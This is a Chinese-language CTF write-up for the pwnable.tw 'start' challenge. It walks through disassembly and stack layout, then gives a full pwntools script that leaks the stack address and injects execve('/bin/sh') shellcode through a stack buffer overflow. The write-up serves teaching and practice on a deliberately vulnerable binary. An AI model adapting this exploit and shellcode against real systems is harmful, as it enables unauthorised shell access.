---
title: pwnable.tw start writeup
date: 2026-09-09
tags:
  - CTF
  - Security
keywords:
  - pwnable.tw
  - writeup
  - CTF
  - security
  - binary exploitation
  - exploitation
---

## Checksec

```sh
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

i386 架構，沒保護

## Reverse

```sh
pwndbg> info function
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
pwndbg> disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
End of assembler dump.
```

```asm
push   esp            ; 把當前堆疊指標壓入堆疊
push   0x804809d      ; _exit 的位址放進堆疊
xor    eax,eax        ; 清空 eax, ebx, ecx, edx
xor    ebx,ebx
xor    ecx,ecx
xor    edx,edx
push   0x3a465443     ; "CTF:"
push   0x20656874     ; "the "
push   0x20747261     ; "art "
push   0x74732073     ; "s st"
push   0x2774654c     ; "Let'"   => push "Let's start the CTF:"
mov    ecx,esp        ; 把當前堆疊指標存入 ecx(即要印出的字串的來源)
mov    dl,0x14        ; bytes length
mov    bl,0x1         ; file descriptor (stdout)
mov    al,0x4         ; sys_write
int    0x80
xor    ebx,ebx
mov    dl,0x3c        ; number of bytes to read
mov    al,0x3         ; sys_read
int    0x80
add    esp,0x14       ; 恢復堆疊指標
ret
```

## Stack Analysis

逐行分析堆疊狀況

1. entry point (_start)
  - 設最一開始，也就是此時的 ESP 指向 ESP0
2. push esp
  - 此時 ESP 的值為 ESP0 - 4
  - 堆疊頂部存放的是原本的 ESP 值 (ESP0)，`[ESP0 - 4] = ESP0`
3. push 0x804809d
  - 此時 ESP 的值為 ESP0 - 8
  - 堆疊頂部存放的是 _exit 的位址(return address)，`[ESP0 - 8] = 0x804809d`
4. push "Let's start the CTF:"
  - 此時 ESP 的值為 ESP0 - 8 - 0x14 = ESP0 - 0x1C
  - 堆疊頂部存放的是 "Let's start the CTF:" 的字串，`[ESP0 - 0x1C ...ESP0 - 9] = "Let's start the CTF:"`

此時畫出堆疊的結構會長這樣：

| Address | Value |
| ------- | ----- |
| ESP0 - 0x1C | "Let' |
| ESP0 - 0x18 | "s st" |
| ESP0 - 0x14 | "art " |
| ESP0 - 0x10 | "the " |
| ESP0 - 0xC  | "CTF:" |
| ESP0 - 8    | 0x804809d (_exit) |
| ESP0 - 4    | ESP0 |

## Exploitation

程式碼可以看到堆疊只給 20 bytes 的緩衝區，但 read 可以讀 60 bytes，有 Stack overflow。

利用 ret2sc，把 shellcode 放入堆疊，並覆蓋返回地址，使程式執行我們的 shellcode。

但問題是我們不知道 return address 要蓋什麼，不知道跳去哪，有 ASLR 每次地址都不一樣所以不能寫死，程式為 static linked 不能 ret2libc，
所以需要先讓程式印出 stack 位址，然後再算出 shellcode 在哪。

根據這段：

```asm
0x08048087 <+39>:    mov    ecx,esp ; <- 以當下 esp 作為要印出的字串的來源
0x08048089 <+41>:    mov    dl,0x14
0x0804808b <+43>:    mov    bl,0x1
0x0804808d <+45>:    mov    al,0x4
0x0804808f <+47>:    int    0x80    ; write(1, esp, 20)
```

只要讓 ret 指到 write，就會讓程式再印一次 20 bytes，但這次會從 ret 後面的 esp，也就是 ESP0 - 4 開始印，就能 leak ESP0。

可以得到 payload1

```py
payload1 = b'A' * 20 + p32(0x8048087)  # address of write function
```

write 跑完後會到 read，且 read 會放的緩衝區為 ESP0-4，之後 ret 是 [ESP0 + 16]，跟第一次一樣的 offset。

read 上限為 60 bytes，扣掉 20 bytes 垃圾以及 return address 的 4 bytes，還剩 36 bytes 可以用來放 shellcode。

shellcode 來源：[https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve_-bin-sh.c](https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve_-bin-sh.c)

Exploit.py

```py
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.os   = 'linux'
context.log_level = 'debug'

if args.REMOTE:
    p = remote('chall.pwnable.tw', 10000)
else:
    p = process('./start')

write_addr = 0x8048087

payload1 = b'A' * 20 + p32(write_addr)

p.recvuntil(b"Let's start the CTF:")
p.send(payload1)

leak = p.recv(20)
esp0 = u32(leak[:4])
log.success(f'leaked ESP0 = {esp0:#x}')

shellcode_addr = esp0 + 20 # (ESP0-4) + 24
shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
log.success(f'shellcode will be at {shellcode_addr:#x}')

payload2 = b'B' * 20 + p32(shellcode_addr) + shellcode
p.send(payload2)
p.interactive()
```